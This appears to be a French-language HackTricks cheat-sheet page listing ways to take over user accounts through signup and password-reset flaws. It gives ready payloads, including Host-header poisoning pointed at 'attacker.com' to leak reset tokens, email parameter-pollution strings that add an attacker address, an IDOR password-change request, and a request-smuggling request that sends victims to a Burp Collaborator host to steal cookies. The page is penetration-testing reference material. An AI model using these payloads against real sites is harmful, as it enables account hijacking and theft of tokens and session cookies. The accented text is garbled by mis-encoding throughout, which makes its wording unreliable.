# Vuln√©rabilit√©s d'inscription et de prise de contr√¥le

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Prise de contr√¥le d'inscription

### Inscription en double

* Essayez de g√©n√©rer en utilisant un nom d'utilisateur existant
* V√©rifiez en variant l'e-mail :
  * majuscules
  * \+1@
  * ajouter quelque chose dans l'e-mail
  * caract√®res sp√©ciaux dans le nom de l'e-mail (%00, %09, %20)
  * Mettre des caract√®res noirs apr√®s l'e-mail : `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### √ânum√©ration des noms d'utilisateur

V√©rifiez si vous pouvez d√©terminer quand un nom d'utilisateur a d√©j√† √©t√© enregistr√© dans l'application.

### Politique de mot de passe

En cr√©ant un utilisateur, v√©rifiez la politique de mot de passe (v√©rifiez si vous pouvez utiliser des mots de passe faibles).\
Dans ce cas, vous pouvez essayer de forcer les informations d'identification.

### Injection SQL

[**Consultez cette page**](sql-injection/#insert-statement) pour apprendre comment tenter des prises de contr√¥le de compte ou extraire des informations via des **injections SQL** dans les formulaires d'inscription.

### Prises de contr√¥le Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vuln√©rabilit√©s SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Changer l'e-mail

lorsque vous √™tes enregistr√©, essayez de changer l'e-mail et v√©rifiez si cette modification est correctement valid√©e ou si vous pouvez la changer en e-mails arbitraires.

### Plus de v√©rifications

* V√©rifiez si vous pouvez utiliser des e-mails **jetables**
* **Long** **mot de passe** (>200) conduit √† une **DoS**
* **V√©rifiez les limites de taux de cr√©ation de compte**
* Utilisez username@**burp\_collab**.net et analysez le **callback**

## **Prise de contr√¥le de r√©initialisation de mot de passe**

### Fuite de jeton de r√©initialisation de mot de passe via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Demandez une r√©initialisation de mot de passe √† votre adresse e-mail
2. Cliquez sur le lien de r√©initialisation de mot de passe
3. Ne changez pas le mot de passe
4. Cliquez sur n'importe quel site tiers (par exemple : Facebook, Twitter)
5. Interceptez la demande dans le proxy Burp Suite
6. V√©rifiez si l'en-t√™te referer fuit le jeton de r√©initialisation de mot de passe.

### Poisoning de r√©initialisation de mot de passe <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptez la demande de r√©initialisation de mot de passe dans Burp Suite
2. Ajoutez ou modifiez les en-t√™tes suivants dans Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Transmettez la demande avec l'en-t√™te modifi√©\
   `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Recherchez une URL de r√©initialisation de mot de passe bas√©e sur l'en-t√™te _host_ comme : `https://attacker.com/reset-password.php?token=TOKEN`

### R√©initialisation de mot de passe via le param√®tre e-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les param√®tres API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et acc√©der √† la fonctionnalit√© **Changer de mot de passe**.
2. D√©marrer Burp Suite et intercepter la requ√™te.
3. Envoyer la requ√™te √† l'onglet Repeater et modifier les param√®tres : ID utilisateur/email\
   `powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Jeton de r√©initialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le jeton de r√©initialisation de mot de passe doit √™tre g√©n√©r√© de mani√®re al√©atoire et unique √† chaque fois.\
Essayez de d√©terminer si le jeton expire ou s'il est toujours le m√™me, dans certains cas, l'algorithme de g√©n√©ration est faible et peut √™tre devin√©. Les variables suivantes peuvent √™tre utilis√©es par l'algorithme.

* Horodatage
* ID utilisateur
* Adresse e-mail de l'utilisateur
* Pr√©nom et nom de famille
* Date de naissance
* Cryptographie
* Nombre seulement
* Petite s√©quence de jeton (caract√®res entre \[A-Z,a-z,0-9])
* R√©utilisation de jeton
* Date d'expiration du jeton

### Fuite de jeton de r√©initialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. D√©clenchez une demande de r√©initialisation de mot de passe en utilisant l'API/UI pour un e-mail sp√©cifique, par exemple : test@mail.com
2. Inspectez la r√©ponse du serveur et recherchez `resetToken`
3. Ensuite, utilisez le jeton dans une URL comme `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### R√©initialisation de mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le syst√®me avec un nom d'utilisateur identique √† celui de la victime, mais avec des espaces blancs ins√©r√©s avant et/ou apr√®s le nom d'utilisateur. par exemple : `"admin "`
2. Demandez une r√©initialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le jeton envoy√© √† votre e-mail et r√©initialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd √©tait vuln√©rable √† cette attaque.\
Voir : [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contr√¥le de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez une XSS √† l'int√©rieur de l'application ou d'un sous-domaine si les cookies sont limit√©s au domaine parent : `*.domain.com`
2. Fuite du cookie de session actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contr√¥le de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Utilisez **smuggler** pour d√©tecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Cr√©ez une requ√™te qui √©crasera `POST / HTTP/1.1` avec les donn√©es suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but de rediriger les victimes vers burpcollab et de voler leurs cookies\
3\. La requ√™te finale pourrait ressembler √† la suivante
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Des rapports de Hackerone ont exploit√© cette faille\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Prise de contr√¥le de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Cr√©er une charge utile pour le CSRF, par exemple : "Formulaire HTML avec une soumission automatique pour un changement de mot de passe"
2. Envoyer la charge utile

### Prise de contr√¥le de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token peut √™tre utilis√© pour authentifier un utilisateur.

* Modifier le JWT avec un autre ID utilisateur / e-mail
* V√©rifier la signature JWT faible

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
